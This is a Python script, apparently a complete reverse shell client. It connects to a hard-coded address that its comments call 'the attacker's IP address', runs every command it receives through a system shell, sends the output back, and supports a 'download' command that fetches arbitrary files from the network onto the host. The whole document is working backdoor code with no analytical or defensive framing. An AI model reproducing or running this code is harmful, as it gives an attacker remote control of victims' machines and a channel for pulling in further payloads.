import socket
import subprocess
import os
import requests

def execute_command(command):
    try:
        if command.startswith("cd "):  # Handle 'cd' command separately
            new_dir = command[3:].strip()
            try:
                os.chdir(new_dir)
                return f"Changed directory to: {new_dir}"
            except Exception as e:
                return f"Failed to change directory: {str(e)}"
        elif command.startswith("download "):  # Handle file download
            url = command[9:].strip()
            return download_file(url)
        else:
            # Execute the command and capture the output
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                return result.stdout
            else:
                return f"Error: {result.stderr}"
    except Exception as e:
        return f"Exception: {str(e)}"

def download_file(url):
    try:
        # Extract the filename from the URL
        filename = url.split("/")[-1]
        
        # Send a GET request to download the file
        response = requests.get(url, stream=True)
        response.raise_for_status()  # Raise an error for bad status codes

        # Save the file to the current directory
        with open(filename, "wb") as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)

        return f"File downloaded: {filename}"
    except Exception as e:
        return f"Failed to download file: {str(e)}"

def start_client():
    host = '192.168.68.118'  # Replace with the attacker's IP address
    port = 12345  # Port to connect to

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    while True:
        try:
            # Receive a command from the attacker
            command = client_socket.recv(1024).decode()
            if command.lower() == 'exit':
                break

            # Execute the command and send the output back
            output = execute_command(command)
            client_socket.send(output.encode())

        except Exception as e:
            print(f"Error: {e}")
            break

    client_socket.close()

if __name__ == "__main__":
    start_client()
